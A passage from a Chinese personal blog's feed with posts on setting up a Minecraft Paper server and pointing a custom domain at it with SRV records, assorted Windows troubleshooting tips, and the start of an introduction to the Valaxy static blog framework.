才能被正常应用。</td><td></td><td></td><td></td></tr><tr><td>level-seed</td><td>字符串</td><td>空白</td><td>与单人游戏类似，为你的世界定义一个种子。</td></tr><tr><td>这里有一些例子：minecraft，404，1a2b3c。</td><td></td><td></td><td></td></tr><tr><td>level-type</td><td>字符串</td><td>minecraft:normal</td><td>使用世界预设 ID，确定地图所生成的类型。</td></tr><tr><td>使用世界预设 ID 时，需要在其中的“:”前加“\”转义。原版世界预设 ID 可以省略其前面的“minecraft:”（即命名空间）。</td><td></td><td></td><td></td></tr><tr><td>minecraft:normal - 带有丘陵、河谷、海洋等的标准的世界。</td><td></td><td></td><td></td></tr><tr><td>minecraft:flat - 一个没有特性的平坦世界，可用 generator-settings 修改。</td><td></td><td></td><td></td></tr><tr><td>minecraft:large_biomes - 如同默认的世界，但所有生物群系都更大。</td><td></td><td></td><td></td></tr><tr><td>minecraft:amplified - 如同默认的世界，但世界生成高度提高。</td><td></td><td></td><td></td></tr><tr><td>minecraft:single_biome_surface - 单一生物群系世界，可用 generator-settings 修改。</td><td></td><td></td><td></td></tr><tr><td>log-ips</td><td>布尔值</td><td>true</td><td>是否在有新玩家加入游戏时，在服务器日志中记录其 IP 地址。</td></tr><tr><td>true - 在日志中记录新加入玩家的 IP 地址。</td><td></td><td></td><td></td></tr><tr><td>false - 在日志中隐藏新加入玩家的 IP 地址。</td><td></td><td></td><td></td></tr><tr><td>max-build-height</td><td>整数</td><td>256</td><td>玩家在游戏中能够建造的最大高度。可能会在该值较小时生成超过该值的地形。</td></tr><tr><td>max-chained-neighbor-updates</td><td>整数 [需要更多信息]</td><td>1000000</td><td>限制连锁 NC 更新的数量，超过此数量的连锁 NC 更新会被跳过。若为负数则无限制。</td></tr><tr><td>max-players</td><td>整数（0-2147483647）</td><td>20</td><td>服务器同时能容纳的最大玩家数量。请注意，在线玩家越多，对服务器造成的负担也就越大。同样注意，服务器的 OP 具有在人满的情况下强行进入服务器的能力：找到在服务器根目录下叫 ops.json 的文件并打开，将需要此能力的 OP 下的 bypassesPlayerLimit 选项设置为 true 即可（默认值为 false），这意味着 OP 将不需要在服务器人满时等待有玩家离开后再加入。过大的数值会使客户端显示的玩家列表崩坏。</td></tr><tr><td>max-tick-time</td><td></td><td></td><td></td></tr><tr><td>整数（0–(2^63 - 1)）</td><td>60000</td><td>设置每个 tick 花费的最大毫秒数。超过该毫秒数时，服务器 watchdog 插件将停止服务器程序并附带上信息：服务器的一个 tick 花费了 60.00 秒（最长也应该只有 0.05 秒）；判定服务器已崩溃，它将被强制关闭。遇到这种情况的时候，它会调用 System.exit(1)。</td><td></td></tr><tr><td>译者注：如果你监测服务程序的返回代码，此时返回代码会为 1。（习惯上，程序正常退出应当返回 0）</td><td></td><td></td><td></td></tr><tr><td>-1 - 完全停用 watchdog 插件（这个停用选项在 14w32a 快照中添加）</td><td></td><td></td><td></td></tr><tr><td>max-world-size</td><td></td><td></td><td></td></tr><tr><td>整数（1-29999984）</td><td>29999984</td><td>设置可让世界边界获得的最大半径值，单位为方块。通过成功执行的命令能把世界边界设置得更大，但不会超过这里设置的最大方块限制。如果设置的 max-world-size 超过默认值的大小，那将不会起任何效果。</td><td></td></tr><tr><td>例如：</td><td></td><td></td><td></td></tr><tr><td>设置 max-world-size 为 1000 将会有 2000×2000 的地图边界。</td><td></td><td></td><td></td></tr><tr><td>设置 max-world-size 为 4000 将会有 8000×8000 的地图边界。</td><td></td><td></td><td></td></tr><tr><td>motd</td><td>字符串</td><td>A Minecraft Server</td><td>本属性值是玩家客户端的多人游戏服务器列表中显示的服务器信息，显示于名称下方。</td></tr><tr><td>MOTD 支持样式代码。</td><td></td><td></td><td></td></tr><tr><td>MOTD 支持特殊符号，比如&quot;♥&quot;。然而，这些符号需要转换为 Unicode 转义字符。你可以在这里找到一个转换器。</td><td></td><td></td><td></td></tr><tr><td>如果 MOTD 超过 59 个字符，服务器列表很可能会返回“通讯错误”。</td><td></td><td></td><td></td></tr><tr><td>network-compression-threshold</td><td></td><td></td><td></td></tr><tr><td>整数</td><td>256</td><td>默认会允许 n-1 字节的数据包正常发送，如果数据包为 n 字节或更大时会进行压缩。所以，更低的数值会使得更多的数据包被压缩，但是如果被压缩的数据包字节太小将反而使压缩后字节更大。</td><td></td></tr><tr><td>-1 - 完全禁用数据包压缩</td><td></td><td></td><td></td></tr><tr><td>0 - 压缩全部数据包</td><td></td><td></td><td></td></tr><tr><td>注：以太网规范要求把小于 64 字节的数据包填充为 64 字节。因此，设置一个低于 64 的值可能没有什么好处。也不推荐让设置的值超过 MTU（通常为 1500 字节）。</td><td></td><td></td><td></td></tr><tr><td>online-mode</td><td>布尔值</td><td>true</td><td>是否让服务器对比 Minecraft 账户数据库验证登录信息。只有在你的服务器并未与 Internet 连接时，才将这个值设为 false。如果设为 false，黑客就能够使用任意假账户连接服务器！如果 <a href="http://minecraft.net" rel="external nofollow noreferrer">minecraft.net</a> 服务器宕机或不可访问，那么该值设为 true 的服务器会因为无法验证玩家身份而拒绝所有玩家加入。通常，这个值设为 true 的服务器被称为“正版服务器”。故意设定该变量为 false 的服务器称为“破解服务器”（也称离线服务器），这类服务器允许拥有未授权的 Minecraft 副本的玩家加入。</td></tr><tr><td>true - 启用。服务器会认为自己具有 Internet 连接，并检查每一位连入的玩家。</td><td></td><td></td><td></td></tr><tr><td>false - 禁用。服务器不会尝试检查玩家。</td><td></td><td></td><td></td></tr><tr><td>op-permission-level</td><td>整数（1-4）</td><td>4</td><td>设定使用/op 命令时 OP 的权限等级。所有存档会从之前的存档继承能力和命令。</td></tr><tr><td>1 - OP 可以绕过重生点保护。</td><td></td><td></td><td></td></tr><tr><td>2 - OP 可以使用所有单人游戏作弊命令（除了/publish，因为不能在服务器上使用；/debug 也是）并使用命令方块。命令方块和领域服服主/管理员有此等级权限。</td><td></td><td></td><td></td></tr><tr><td>3 - OP 可以使用大多数多人游戏中独有的命令，包括 /debug，以及管理玩家的命令（/ban，/op 等等）。</td><td></td><td></td><td></td></tr><tr><td>4 - OP 可以使用所有命令，包括 /stop, /save-all, /save-on 和 /save-off。</td><td></td><td></td><td></td></tr><tr><td>player-idle-timeout</td><td>整数</td><td>0</td><td>如果不为 0，服务器将在玩家的空闲时间达到设置的时间（单位为分钟）时将玩家踢出服务器</td></tr><tr><td>注：当服务器接受到下列数据包之一时将会重置空闲时间：</td><td></td><td></td><td></td></tr><tr><td>点击窗口</td><td></td><td></td><td></td></tr><tr><td>附魔物品</td><td></td><td></td><td></td></tr><tr><td>更新告示牌</td><td></td><td></td><td></td></tr><tr><td>玩家挖掘方块</td><td></td><td></td><td></td></tr><tr><td>玩家放置方块</td><td></td><td></td><td></td></tr><tr><td>更换拿着的物品</td><td></td><td></td><td></td></tr><tr><td>动画（挥动手臂）</td><td></td><td></td><td></td></tr><tr><td>实体动作</td><td></td><td></td><td></td></tr><tr><td>客户端状态</td><td></td><td></td><td></td></tr><tr><td>聊天信息</td><td></td><td></td><td></td></tr><tr><td>使用实体</td><td></td><td></td><td></td></tr><tr><td>prevent-proxy-connections</td><td>布尔值</td><td>false</td><td>如果服务器发送的 ISP/AS 和 Mojang 的验证服务器的不一样，玩家将会被踢出。</td></tr><tr><td>true - 启用。服务器将会禁止玩家使用虚拟专用网络或代理。</td><td></td><td></td><td></td></tr><tr><td>false - 禁用。服务器将不会禁止玩家使用虚拟专用网络或代理。</td><td></td><td></td><td></td></tr><tr><td>pvp</td><td>布尔值</td><td>true</td><td>是否允许 PvP。也只有在允许 PvP 时玩家自己的箭才会受到伤害。</td></tr><tr><td>true - 玩家可以互相伤害。</td><td></td><td></td><td></td></tr><tr><td>false - 玩家无法互相造成伤害（也称作玩家对战环境（PvE））。</td><td></td><td></td><td></td></tr><tr><td>注：由玩家造成的间接伤害（例如熔岩，火，TNT 等，某种程度上还有水，沙子和沙砾）还是会伤害其他玩家。</td><td></td><td></td><td></td></tr><tr><td>query.port</td><td>整数（1-65534）</td><td>25565</td><td>设置监听服务器的端口号（参见 enable-query）。</td></tr><tr><td>rate-limit</td><td>整数</td><td>0</td><td>设置玩家被踢出服务器前，可以发送的数据包数量。</td></tr><tr><td>设置为 0 表示关闭此功能。</td><td></td><td></td><td></td></tr><tr><td>rcon.password</td><td>字符串</td><td>空白</td><td>设置 RCON 远程访问的密码（参见 enable-rcon）。RCON：能允许其他应用程序通过互联网与 Minecraft 服务器连接并交互的远程控制台协议。</td></tr><tr><td>rcon.port</td><td>整数（1-65534)</td><td>25565</td><td>设置 RCON 远程访问的端口号。</td></tr><tr><td>require-resource-pack</td><td>布尔值</td><td>false</td><td>当此选项启用（设为 true）时，玩家会被提示作出选择（是否启用服务器资源包）。如果玩家拒绝则会被服务器断开连接。</td></tr><tr><td>但是，若玩家使用 Linux 系统加入服务器，游戏目录内的 server-resource-packs 没有写权限，则会提示“无法应用服务器资源包”“所有依赖自定义资源包的功能都有可能不按预期工作”，并提示玩家“继续”或“断开连接”。若玩家选择“继续”，则仍可在此服务器中游戏。</td><td></td><td></td><td></td></tr><tr><td>resource-pack</td><td>字符串</td><td>空白</td><td>可选选项，可输入指向一个资源包的 URI。玩家可选择是否使用该资源包。</td></tr><tr><td>注意若该值含&quot;:“和”=&quot;字符，需要在其前加上反斜线 ()，例如 http://somedomain.com/somepack.zip?someparam=somevalue 资源包大小理应不能超过</td><td></td><td></td><td></td></tr><tr><td>50 MiB（1.15-pre5 前）</td><td></td><td></td><td></td></tr><tr><td>100 MiB（1.15-pre5 到 1.18-pre8）</td><td></td><td></td><td></td></tr><tr><td>250 MiB（1.18-rc1 起）</td><td></td><td></td><td></td></tr><tr><td>注意，下载成功或失败由客户端记录，而非服务器。</td><td></td><td></td><td></td></tr><tr><td>resource-pack-prompt</td><td>字符串</td><td>空白</td><td></td></tr><tr><td>可选，用于在使用 require-resource-pack 时在资源包提示界面显示自定义信息。</td><td></td><td></td><td></td></tr><tr><td>与聊天组件语法一致，可以包含多行文本。</td><td></td><td></td><td></td></tr><tr><td>resource-pack-sha1</td><td>字符串</td><td>空白</td><td>资源包的 SHA-1 值，必须为小写十六进制，建议填写它。这还没有用于验证资源包的完整性，但是它提高了资源包缓存的有效性和可靠性。</td></tr><tr><td>server-ip</td><td>字符串</td><td>空白</td><td>将服务器与一个特定 IP 绑定。强烈建议留空该属性值！</td></tr><tr><td>留空，或是填入你想让服务器绑定（监听）的 IP。</td><td></td><td></td><td></td></tr><tr><td>server-port</td><td>整数（1-65534）</td><td>25565</td><td>改变服务器（监听的）端口号。如果服务器在使用 NAT 的网络中运行，该端口必须被转发（在你有家用路由器/防火墙的前提下）。</td></tr><tr><td>simulation-distance</td><td>整数（3-32）</td><td>10</td><td>设置服务端可更新实体范围的最大值，即玩家各个方向上的区块数量（是以玩家为中心的半径，不是直径）。超出此范围的实体不会被更新，对玩家也不可见。</td></tr><tr><td>默认/推荐设置为 10，如果有严重卡顿的话，减少该数值。</td><td></td><td></td><td></td></tr><tr><td>spawn-animals</td><td>布尔值</td><td>true</td><td>决定动物是否可以生成。</td></tr><tr><td>true - 动物可以正常生成。</td><td></td><td></td><td></td></tr><tr><td>false - 动物生成后会立即消失。</td><td></td><td></td><td></td></tr><tr><td>提示：如果你有严重的卡顿，可以设为 false。</td><td></td><td></td><td></td></tr><tr><td>spawn-monsters</td><td>布尔值</td><td>true</td><td>决定攻击型生物（怪物）是否可以生成。</td></tr><tr><td>true - 启用。怪物会生成于夜晚和黑暗处。</td><td></td><td></td><td></td></tr><tr><td>false - 禁用。不会有任何怪物。</td><td></td><td></td><td></td></tr><tr><td>如果 difficulty=0（即难度设置为和平）的话，该属性值不会有任何影响。</td><td></td><td></td><td></td></tr><tr><td>提示：如果你有严重的卡顿，可以设为 false。</td><td></td><td></td><td></td></tr><tr><td>spawn-npcs</td><td>布尔值</td><td>true</td><td>决定是否生成村民。</td></tr><tr><td>true - 启用。生成村民。</td><td></td><td></td><td></td></tr><tr><td>false - 禁用。不生成村民。</td><td></td><td></td><td></td></tr><tr><td>spawn-protection</td><td>整数</td><td>16</td><td>通过将该值进行 2x+1 的运算来决定出生点的保护半径。设置为 1 会保护以出生点为中心的 3×3 方块的区域，2 会保护 5×5 方块的区域，3 会保护 7×7 方块的区域，以此类推。这个选项不在第一次服务器启动时生成，只会在第一个玩家加入服务器时出现。如果服务器没有设置 OP，这个选项会自动禁用。</td></tr><tr><td>设置为 0 会禁用出生点保护。</td><td></td><td></td><td></td></tr><tr><td>sync-chunk-writes</td><td>布尔值</td><td>true</td><td>启用后区块文件以同步模式写入。</td></tr><tr><td>text-filtering-config</td><td>字符串 [需要测试]</td><td>空白</td><td>服务器中需要被屏蔽的文本。[需要测试]</td></tr><tr><td>use-native-transport</td><td>布尔值</td><td>true</td><td>是否使用针对 Linux 平台的数据包收发优化。此选项仅会在 Linux 平台上生成。</td></tr><tr><td>true - 启用。启用 Linux 数据包收发优化。</td><td></td><td></td><td></td></tr><tr><td>false - 禁用。禁用 Linux 数据包收发优化。</td><td></td><td></td><td></td></tr><tr><td>view-distance</td><td>整数（3-32）</td><td>10</td><td>设置服务端发送给客户端的世界数据量，也就是设置玩家各个方向上的区块数量（是以玩家为中心的半径，不是直径）。它决定了服务端的可视距离。（另见渲染距离）</td></tr><tr><td>默认/推荐设置为 10，如果有严重卡顿的话，减少该数值。</td><td></td><td></td><td></td></tr><tr><td>white-list</td><td>布尔值</td><td>false</td><td>启用服务器的白名单。</td></tr><tr><td>当启用时，只有白名单上的用户才能连接服务器。白名单主要用于私人服务器，例如提供给相识的朋友、通过应用流程谨慎选择的陌生人等。</td><td></td><td></td><td></td></tr><tr><td>false - 不使用白名单。</td><td></td><td></td><td></td></tr><tr><td>true - 从 whitelist.json 文件加载白名单。</td><td></td><td></td><td></td></tr><tr><td>注：OP 会自动被视为在白名单上，所以无需再将 OP 加入白名单。</td><td></td><td></td><td></td></tr></tbody></table></div></details><p>等终端表明运行成功，你可以打开你的 Minecraft 游戏，连接服务器（本地设备的话内网 IP 自行百度获取方法；端口号是你那个配置文件中<code>rcon.port=25565</code>后的内容（此处示例是<code>25565</code>））。</p><p>至此，你的 Paper 服务器已经搭建完成。剩下如插件、指令等将由您自行发挥。</p><p>至于外网访问，如果你之前选择的服务器是外界可以正常访问（例如公网 IP、服务商分配域名之类），那么这一步可以忽略</p><p>外界访问，本地设备没公网，又不想给运营商打电话，咋整？内网穿透自行解决呗。</p><h4 id="常见问题">常见问题</h4><blockquote><p>进入服务器验证失败</p></blockquote><p>大概率是因为你没有使用正版 Minecraft。请找到<code>server.properties</code>文件中<code>online-mode=</code>参数，将<code>true</code>改为<code>false</code></p><blockquote><p>我为什么不能使用命令方块</p></blockquote><p>配置文件找<code>enable-command-block=false</code>，把<code>false</code>改为<code>true</code></p><blockquote><p>我该如何调整最大玩家数量</p></blockquote><p>配置文件找<code>max-players=20</code>，自行修改后面的数字</p><h2 id="自定义域名">自定义域名</h2><h3 id="背景">背景</h3><p>我是学生党很穷，服务器只能用时创建不用时销毁；没有固定 IP，地址变来变去；我服务器和别人合用/我用的是面板服，端口是随机分配的……</p><p>如果你手头有一个域名那么这事就很好办了。只要你能在开服时及时将域名解析好，好友只需记住你这个域名即可连接，而且可以实现免端口访问。</p><p><strong>SRV 记录</strong>，它是 DNS 服务器的数据库中支持的一种资源记录类型，用来标识某台服务器使用了某个服务，常见于 Microsoft 系统的目录管理。</p><p>不同服务商的界面可能略有不同，此处以<code>Cloudflare</code>为例（记得设置为仅 DNS）。</p><h3 id="做法">做法</h3><p>进入 Cloudflare 控制台（其他 DNS 服务商不确定），点击你已添加且将要使用的域名（以<code>example.com</code>为例），在左侧找到<code>记录</code>-&gt;<code>DNS</code>，在右边界面找到<code>添加记录</code>按钮并点击。</p><p>添加 A 记录填写如下（本地内网穿透的方案我没有尝试过）：</p><table><thead><tr><th>参数</th><th>内容</th></tr></thead><tbody><tr><td>类型</td><td>A</td></tr><tr><td>名称 （必需）</td><td>mcs</td></tr><tr><td>IPv4 地址 （必需）</td><td>255.255.255.255</td></tr><tr><td>代理状态</td><td>仅 DNS</td></tr><tr><td>TTL</td><td>1 分钟</td></tr></tbody></table><p>这段的效果大致是：如果你的服务器所在的 IP 是<code>255.255.255.255</code>，并且你分配到或你自行配置的端口为<code>25565</code>，那么你可以通过<code>mcs.example.com:25565</code>进行连接。</p><p>IPv4 地址为你选择的服务器提供的 IP，面板服或只提供域名的请自行 Ping 服务商提供的域名。不知道端口号的，可以查看根目录下的配置文件<code>server.properties</code>，找到类似于<code>port</code>一项进行查看（例如 paper 核心的服务器，如果其配置文件中有<code>rcon.port=25565</code>，则表明端口为<code>25565</code>）。</p><p>很显然，只这么做，进入服务器还是要输入端口号，这可不是我们期望的。</p><p>同一个域名可以同时存在 SRV 和 A 解析，这时候就可以再添加 SRV 记录来实现这个功能。</p><p>SRV 记录填写如下：</p><table><thead><tr><th>参数</th><th>内容</th></tr></thead><tbody><tr><td>类型</td><td>SRV</td></tr><tr><td>名称 （必需）</td><td>mcs</td></tr><tr><td>服务 （必需）</td><td>_minecraft</td></tr><tr><td>协议 （必需）</td><td>TCP</td></tr><tr><td>TTL</td><td>1 分钟</td></tr><tr><td>优先级 （必需）</td><td>5</td></tr><tr><td>权重 （必需）</td><td>0</td></tr><tr><td>端口 （必需）</td><td>25565</td></tr><tr><td>目标 （必需）</td><td><a href="http://mcs.example.com" rel="external nofollow noreferrer">mcs.example.com</a></td></tr></tbody></table><p>这里的效果大致为：<code>_minecraft._tcp.mcs.example.com</code>指向<code>mcs.example.com</code>并侦听<code>_minecraft</code>服务的<code>_tcp</code>端口<code>25565</code>。</p><p>如果你发现你的服务器只给了<code>解析记录</code>这样的填写处，那可以试试这样填写：<code>5 0 25565 mcs.example.com</code></p><p>以上设置完后保存即可，等待解析同步 DNS 缓存，2 小时内同步完成（但往往几分钟之内即可）。</p><p>之后便可访问<code>mcs.example.com</code>连接 MC 服务器，无需另外输入端口。</p><p>至此，你的 MC 服务器自定义访问域名也已配置完成。</p><h2 id="后记">后记</h2><p>参考：</p><p><a href="https://zhuanlan.zhihu.com/p/142014944" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/142014944</a><br><a href="https://guide.minecraft.kim/guide" rel="external nofollow noreferrer">https://guide.minecraft.kim/guide</a><br><a href="https://blog.csdn.net/starvapour/article/details/113415562" rel="external nofollow noreferrer">https://blog.csdn.net/starvapour/article/details/113415562</a><br><a href="https://zhuanlan.zhihu.com/p/508274523" rel="external nofollow noreferrer">https://zhuanlan.zhihu.com/p/508274523</a><br><a href="https://dusays.com/383/" rel="external nofollow noreferrer">https://dusays.com/383/</a><br><a href="https://www.mcio.cn/274.html" rel="external nofollow noreferrer">https://www.mcio.cn/274.html</a><br><a href="https://blog.icyuyan.net/technology/SRV-Tutorial.html" rel="external nofollow noreferrer">https://blog.icyuyan.net/technology/SRV-Tutorial.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Cloudflare </tag>
            
            <tag> Minecraft </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 实用小技巧</title>
      <link href="/posts/3827418539/"/>
      <url>/posts/3827418539/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="文件正在被使用">文件正在被使用</h2><h3 id="结束进程">结束进程</h3><p>使用<code>Ctrl+Shift+Esc</code>打开任务管理器。在顶部找到<code>性能</code>选项卡并选择，在该页面下方点击<code>打开资源监视器</code>按钮。</p><p><img src="https://s2.loli.net/2024/05/11/aERT4tecduNM8Vm.png" alt=""></p><p>之后找到那个提示被占用的文件（夹），复制它的路径（可以通过右键<code>属性</code>-&gt;<code>常规</code>选项卡，找到<code>位置</code>一项，将后面的路径地址复制记录下来，并添加<code>\文件（夹）名称</code>）。也可以在文件资源管理器中找到这个文件，点击上方地址栏并复制其路径；如果是文件则还需手动在路径后面添加文件名称。</p><blockquote><p>例如，如果你提示被占用的文件夹是位于<code>C:\Users\admin\Desktop</code>目录下，名称为<code>demo</code>，则你应记录下的地址为<code>C:\Users\admin\Desktop\demo</code>；如果你提示被占用的文件位于<code>C:\Users\admin\Desktop\demo</code>目录下，名称为<code>demo.html</code>，则你应记录下的地址为<code>C:\Users\admin\Desktop\demo\demo.html</code>。</p></blockquote><p>在资源监视器界面选择顶部找到<code>CPU</code>选项卡，在下方<code>关联的句柄</code>中输入被占用的文件（夹）的名称，也可以输入上面相关文件或文件夹的<code>位置</code>路径。</p><p><img src="https://s2.loli.net/2024/05/11/4hijXN9qIsxFA1B.png" alt=""></p><p>点击搜索，下方会显示哪个程序占用了文件。将这些进程选中并右键<code>结束进程</code>，等待一会，这个文件（夹）便可以被正常操作了。</p><h3 id="重启文件资源管理器">重启文件资源管理器</h3><p>如果你在结束进程时不小心或不得已结束了<code>explorer.exe</code>（文件资源管理器）进程，会导致桌面一并被结束，此时系统桌面为黑色或灰白，无法点击和查看文件。</p><p>此时需要手动运行文件资源管理器主程序。按下键盘上<code>Ctrl+Shift+Esc</code>呼出任务管理器，找到左上角<code>文件</code>-&gt;<code>运行新任务</code>，在弹出窗口中输入<code>explorer.exe</code>并点击<code>确定</code>，等待一会儿，程序启动后桌面即可恢复。</p><p><img src="https://s2.loli.net/2024/05/11/lGyeoP3d8fi5DpR.png" alt=""></p><p>无意中了解到 IObit Unlocker 这个软件，它在解决“无法删除文件”、“访问被拒绝”这样的问题时比较有效，可作为上面那个方法的补充。</p><p>找到被占用的文件或文件夹，将它们拖放到 IObit Unlocker 软件界面。然后点击解锁即可。</p><h2 id="提示文件损坏">提示文件损坏</h2><blockquote><p>复制文件进时候系统提示“一个意外的错误使您 XXX”</p></blockquote><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">设备管理器</button><button type="button" class="tab">扫描驱动器</button><button type="button" class="tab">chkdsk 修复工具</button></div><div class="tab-contents"><div class="tab-item-content active"><p>在桌面找到“此电脑”右键<code>管理</code>（或使用<code>Win+R</code>调出<code>运行</code>窗口后输入<code>Compmgmt.msc</code>）进入计算机管理页面，在左侧选择<code>计算机管理（本地）</code> -&gt; <code>系统工具</code> -&gt; <code>设备管理器</code>，在右侧找到<code>通用串行总线控制器</code>并展开。</p><p>一般来说，U 盘和移动硬盘在这里会被识别为<code>USB 大容量存储设备</code>，可能因实际情况不同而显示不同，不确定的可以重新插拔储存设备后根据此处项目增减进行判断。选中相应的项目后右键<code>卸载设备</code>，之后重新插入储存设备。</p></div><div class="tab-item-content"><p>使用<code>Win+E</code>打开文件资源管理器，找到出现问题的储存器后右键<code>属性</code> -&gt; <code>工具</code>（顶部选项卡） -&gt; <code>查错</code> -&gt; <code>检查</code>。在弹出窗口中点击<code>扫描驱动器</code>，等待执行。</p><p>扫描完成后，会提示“已成功扫描你的驱动器”，点击关闭即可。</p></div><div class="tab-item-content"><p>储存设备提示需要格式化或者提示文件目录损坏无法读取，可以使用系统自带修复工具进行修复。</p><p>使用<code>Win+R</code>调出运行，输入<code>cmd</code>打开命令提示符。之后在窗口内输入修复指令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chkdsk</span> G:/f</span><br></pre></td></tr></table></figure><p>上面这个指令的<code>G</code>是盘符，如果你出现故障的磁盘盘符为<code>H</code>则输入<code>chkdsk H:/f</code>，以此类推。</p><p>等待执行，按照窗口中的提示进行操作（若没扫描出问题则只需等待）。等指令执行完成后，重新插拔储存器进行尝试即可。</p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div><h2 id="关闭-Windows-错误报告">关闭 Windows 错误报告</h2><p>Windows 错误报告可以从用户的计算机收集有关硬件和软件问题的信息，并将这些信息发送给 Microsoft。但最近电脑任务栏突然变得很卡，在任务栏的操作基本需几秒后才响应，偶然发现把这俩禁了后不卡了（可能不是通用解决方法）。</p><p>可用在<code>控制面板</code>-&gt;<code>系统和安全</code>-&gt;<code>安全和维护</code>-&gt;<code>维护</code>中检查 Windows 错误报告的状态。默认情况下，<code>报告问题</code>后面的状态为<code>启用</code>。</p><div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">注册表编辑器</button><button type="button" class="tab">组策略编辑器</button><button type="button" class="tab">服务</button><button type="button" class="tab">msconfig</button></div><div class="tab-contents"><div class="tab-item-content active"><ol><li>按下 <code>Win</code> + <code>R</code> 键，输入 <code>regedit</code> 并回车，打开注册表编辑器。</li><li>导航到 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting</code>。</li><li>右键点击左侧的 <code>Windows Error Reporting</code> ，选择 <code>新建</code> -&gt; <code>DWORD（32 位）值</code>。</li><li>右键点击新的 DWORD 值，将其重命名为 <code>Disabled</code>。然后右键<code>修改</code>，将其值数据设置为 <code>1</code>，随后点击<code>确定</code>保存更改。</li></ol><p><img src="https://s2.loli.net/2024/10/13/1djUSoN9W7PgzBD.png" alt=""></p><p><img src="https://s2.loli.net/2024/10/13/lkxvyZTFrIaYMGP.png" alt=""></p><p>完成后回到前文控制面板的<code>维护</code>页面中进行检查，若<code>报告问题</code>后面的状态是<code>关闭</code>，那么表明修改已生效。</p></div><div class="tab-item-content"><ol><li>按下 <code>Win</code> + <code>R</code> 键，输入 <code>gpedit.msc</code> 并回车，打开组策略编辑器。</li><li>导航到 <code>计算机配置</code> -&gt; <code>管理模板</code> -&gt; <code>Windows 组件</code> -&gt; <code>Windows 错误报告</code>。</li><li>找到 <code>禁用 Windows 错误报告</code> 选项，点击左侧 <code>策略设置</code>。</li><li>在弹出窗口中选择 <code>已启用</code>，然后点击 <code>应用</code> ，之后点击确定按钮关闭弹窗。</li></ol><p><img src="https://s2.loli.net/2024/10/13/Av91NmXwnLaJFrq.png" alt=""></p><p><img src="https://s2.loli.net/2024/10/13/NVsAtdpRZbOHP34.png" alt=""></p></div><div class="tab-item-content"><ol><li>按下 <code>Win + R</code> 键，输入 <code>services.msc</code> 并回车，打开服务。</li><li>找到 <code>Windows Error Reporting Service</code> 服务，双击打开其属性。</li><li>将启动类型设置为<code>禁用</code>，然后点击<code>应用</code>，之后点击确定按钮关闭弹窗。</li></ol><p><img src="https://s2.loli.net/2024/10/13/PFANZy16poHESrR.png" alt=""></p></div><div class="tab-item-content"><p>（该方法貌似不能让控制面板那里<code>报告问题</code>后面的状态变为<code>关闭</code>，可以临时使用）</p><ol><li>按下 <code>Win + R</code> 键，输入 <code>msconfig</code> 并回车，打开系统配置。</li><li>选择顶部<code>服务</code>选项卡，在下方滚动找到<code>Problem Reports Control Panel Support</code>和<code>Windows Error Reporting Service</code>两项服务。</li><li>将前面的勾去掉，然后点击<code>应用</code>。</li></ol><p><img src="https://s2.loli.net/2024/10/13/KeOXi4jVbGA6xpP.png" alt=""></p></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Valaxy 初体验：速度起飞且易于开发</title>
      <link href="/posts/2450481449/"/>
      <url>/posts/2450481449/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>之前假期看到有人表示文章数量破千编译时会报<code>out of memory</code>……虽然我这个站更新不定，也不确定以后能坚持多久，但这才 60 多篇文章 Hexo 的编译速度就已有些慢了。</p><p>虽然 Hexo 官方一直在改进，但消耗的资源还是不小。5.0 版本之后编译时可以在最后添加<code>-c</code>参数以限制线程数，譬如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate -c 10</span><br></pre></td></tr></table></figure><p>除开这个问题，Hexo 在二次开发、调试等情况下还存在着一定的不便。</p><p>Hugo 的编译速度确实飞快，但至少目前我对 Go 不太感兴趣。Jekyll 有 Github 近乎原生的支持，但我目前没有需要使用 Ruby 的地方，不想装太多环境。至于动态博客，起码我是不愿为此支出主机费用的。</p><p>现在，让我们有请：<strong>Valaxy</strong></p><h2 id="介绍">介绍</h2><p><a href="https://valaxy.site/" rel="external nofollow noreferrer">https://valaxy.site/</a></p><blockquote><p>Valaxy = V + Galaxy 旨在成为下一代静态博客框架，提供更好的热更新与用户加载体验、更强大更便捷的自定义开发可能性。</p><p>Valaxy 基于 Vite 提供热更新与打包等功能，基于 Vue 实现视图（如主题、自定义组件）等客户端功能。因此 Valaxy 兼容并可自由使用 Vite 与 Vue 生态的所有插件。</p></blockquote><h2 id="如何使用">如何使用</h2><h3 id="前置条件">前置条件</h3><ul><li>为描述方便，下文默认项目根目录为<code>Blogroot</code>，初始化选择的目录名称为<code>valaxy-blog</code></li><li>本文默认您已将 Git、Node.js 配置完成且可正常使用</li><li>为了较快的速度，建议使用<code>pnpm</code>，可使用以下命令安装：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install -g pnpm # 全局安装 pnpm</span><br><span class="line">pnpm -v # 检查安装版本</span><br><span class="line">pnpm set registry https://registry.npmmirror.com # （可选）更换 pnpm 镜像源为 npmmirror（原淘宝镜像源）</span><br></pre></td></tr></table></figure><ul><li>善用搜索引擎</li></ul><h3 